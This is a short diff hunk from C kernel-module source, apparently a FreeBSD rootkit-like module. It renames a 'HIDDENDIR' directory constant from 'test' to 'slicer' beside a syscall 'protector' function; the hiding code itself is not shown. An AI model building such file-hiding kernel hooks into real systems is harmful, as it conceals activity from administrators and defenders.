@@ -32,7 +32,7 @@
 
 /* Options */
 #define KERNDEBUG 1
-#define HIDDENDIR "test"
+#define HIDDENDIR "slicer"
 
 /* protector implementing function */
 static int protector(struct thread *td, void *syscall_args)
